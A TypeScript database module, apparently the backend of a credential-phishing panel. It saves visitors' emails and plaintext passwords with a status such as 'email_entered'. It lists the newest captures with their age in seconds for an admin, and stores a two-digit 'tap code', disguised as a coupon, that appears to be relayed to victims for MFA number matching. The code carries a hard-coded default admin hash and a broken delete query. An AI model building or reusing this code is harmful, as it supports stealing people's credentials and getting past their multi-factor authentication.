import { Pool } from '@neondatabase/serverless';
import { Pool as PgPool } from 'pg';

// In-memory fallback database for local development if DATABASE_URL is not set yet
interface MemoryUser {
  id: number;
  email: string;
  password: string;
  status: string;
  created_at: Date;
}

interface MemoryTapCode {
  id: number;
  code: string;
  created_at: Date;
}

interface MemoryAdmin {
  id: number;
  username: string;
  password: string;
  created_at: Date;
}

const globalMemoryStore = globalThis as unknown as {
  users: MemoryUser[];
  tapCodes: MemoryTapCode[];
  admins: MemoryAdmin[];
  userAutoId: number;
  tapAutoId: number;
};

if (!globalMemoryStore.users) {
  globalMemoryStore.users = [];
  globalMemoryStore.userAutoId = 1;
  globalMemoryStore.tapCodes = [{ id: 1, code: '22', created_at: new Date() }];
  globalMemoryStore.tapAutoId = 2;
  globalMemoryStore.admins = [
    {
      id: 1,
      username: 'admin',
      // Default hashed password for 'admin123'
      password: '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi',
      created_at: new Date(),
    },
  ];
}

const connectionString = process.env.DATABASE_URL || process.env.POSTGRES_URL;

let neonPool: any = null;

if (connectionString) {
  if (connectionString.includes('neon.tech') || connectionString.includes('vercel-storage.com')) {
    neonPool = new Pool({ connectionString });
  } else {
    neonPool = new PgPool({ connectionString });
  }
}

/**
 * Initialize Neon database schema automatically if connected
 */
export async function initDbSchema() {
  if (!neonPool) return;
  try {
    await neonPool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        status VARCHAR(50) DEFAULT 'email_entered',
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS tap_codes (
        id SERIAL PRIMARY KEY,
        code VARCHAR(10) NOT NULL,
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS admins (
        id SERIAL PRIMARY KEY,
        username VARCHAR(100) NOT NULL UNIQUE,
        password VARCHAR(255) NOT NULL,
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );
    `);

    // Insert default tap code if empty
    const tapRes = await neonPool.query('SELECT COUNT(*) FROM tap_codes');
    if (parseInt(tapRes.rows[0].count, 10) === 0) {
      await neonPool.query("INSERT INTO tap_codes (code) VALUES ('22')");
    }

    // Insert default admin if empty
    const adminRes = await neonPool.query('SELECT COUNT(*) FROM admins');
    if (parseInt(adminRes.rows[0].count, 10) === 0) {
      await neonPool.query(
        "INSERT INTO admins (username, password) VALUES ('admin', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi')"
      );
    }
  } catch (err) {
    console.error('Error initializing database schema:', err);
  }
}

// Ensure schema check is performed when DB pool exists
if (neonPool) {
  initDbSchema().catch(console.error);
}

// Database helper operations
export const db = {
  async saveUser(email: string, password: string, status: string) {
    if (neonPool) {
      // Check existing user with this email
      const checkRes = await neonPool.query(
        'SELECT id FROM users WHERE email = $1 ORDER BY id DESC LIMIT 1',
        [email]
      );
      if (checkRes.rows.length > 0) {
        const userId = checkRes.rows[0].id;
        await neonPool.query(
          'UPDATE users SET password = $1, status = $2 WHERE id = $3',
          [password, status, userId]
        );
        return { success: true, user_id: userId, action: 'updated' };
      } else {
        const insertRes = await neonPool.query(
          'INSERT INTO users (email, password, status) VALUES ($1, $2, $3) RETURNING id',
          [email, password, status]
        );
        return { success: true, user_id: insertRes.rows[0].id, action: 'created' };
      }
    }

    // Fallback Memory Store
    const existingIndex = globalMemoryStore.users.findIndex(u => u.email === email);
    if (existingIndex !== -1) {
      const u = globalMemoryStore.users[existingIndex];
      u.password = password;
      u.status = status;
      return { success: true, user_id: u.id, action: 'updated' };
    } else {
      const newId = globalMemoryStore.userAutoId++;
      globalMemoryStore.users.push({
        id: newId,
        email,
        password,
        status,
        created_at: new Date(),
      });
      return { success: true, user_id: newId, action: 'created' };
    }
  },

  async getUsers() {
    const now = Math.floor(Date.now() / 1000);

    if (neonPool) {
      const res = await neonPool.query(
        'SELECT id, email, password, status, created_at FROM users ORDER BY id DESC LIMIT 50'
      );
      return res.rows.map((row: any) => {
        const createdAtTime = Math.floor(new Date(row.created_at).getTime() / 1000);
        return {
          id: row.id,
          email: row.email,
          password: row.password,
          status: row.status,
          seconds_ago: Math.max(0, now - createdAtTime),
          timestamp: row.created_at,
        };
      });
    }

    // Fallback Memory Store
    const sorted = [...globalMemoryStore.users].sort((a, b) => b.id - a.id).slice(0, 50);
    return sorted.map(u => {
      const createdAtTime = Math.floor(u.created_at.getTime() / 1000);
      return {
        id: u.id,
        email: u.email,
        password: u.password,
        status: u.status,
        seconds_ago: Math.max(0, now - createdAtTime),
        timestamp: u.created_at.toISOString(),
      };
    });
  },

  async updateStatus(userId: number, status: string) {
    if (neonPool) {
      await neonPool.query('UPDATE users SET status = $1 WHERE id = $2', [status, userId]);
      return { success: true };
    }

    // Fallback Memory Store
    const user = globalMemoryStore.users.find(u => u.id === userId);
    if (user) {
      user.status = status;
      return { success: true };
    }
    return { success: false, error: 'User not found' };
  },

  async deleteUser(userId: number) {
    if (neonPool) {
      await neonPool.query('DELETE FROM users WHERE id = $2', [userId]);
      return { success: true };
    }

    // Fallback Memory Store
    globalMemoryStore.users = globalMemoryStore.users.filter(u => u.id !== userId);
    return { success: true };
  },

  async saveCoupon(code: string) {
    if (neonPool) {
      await neonPool.query('INSERT INTO tap_codes (code) VALUES ($1)', [code]);
      return { success: true };
    }

    // Fallback Memory Store
    const newId = globalMemoryStore.tapAutoId++;
    globalMemoryStore.tapCodes.push({ id: newId, code, created_at: new Date() });
    return { success: true };
  },

  async getLatestCoupon() {
    if (neonPool) {
      const res = await neonPool.query('SELECT code FROM tap_codes ORDER BY id DESC LIMIT 1');
      if (res.rows.length > 0) {
        return { coupon: res.rows[0].code };
      }
      return { coupon: '22' };
    }

    // Fallback Memory Store
    if (globalMemoryStore.tapCodes.length > 0) {
      const latest = globalMemoryStore.tapCodes[globalMemoryStore.tapCodes.length - 1];
      return { coupon: latest.code };
    }
    return { coupon: '22' };
  },

  async getAdmin(username: string) {
    if (neonPool) {
      const res = await neonPool.query('SELECT * FROM admins WHERE username = $1', [username]);
      return res.rows[0] || null;
    }

    // Fallback Memory Store
    return globalMemoryStore.admins.find(a => a.username === username) || null;
  },
};
